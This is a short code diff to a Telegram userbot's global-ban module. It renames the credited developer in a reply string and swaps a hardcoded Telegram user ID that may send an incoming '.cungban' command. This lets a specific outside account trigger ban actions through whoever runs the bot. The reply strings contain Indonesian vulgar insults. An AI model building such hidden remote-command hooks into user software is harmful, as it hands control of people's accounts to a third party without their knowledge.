@@ -85,7 +85,7 @@ async def gben(userbot):
     sender = await dc.get_sender()
     me = await dc.client.get_me()
     if not sender.id == me.id:
-        dark = await dc.reply("`Global banned Aktif Ngentot, perintah Rizky!`")
+        dark = await dc.reply("`Global banned Aktif Ngentot, perintah jesUbot!`")
     else:
         dark = await dc.edit("`Memproses Global Banned Bocah Kontol!!`")
     me = await userbot.client.get_me()
@@ -148,7 +148,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-@register(incoming=True, from_users=1493275656, pattern=r"^\.cungban(?: |$)(.*)")
+@register(incoming=True, from_users=1683788007, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
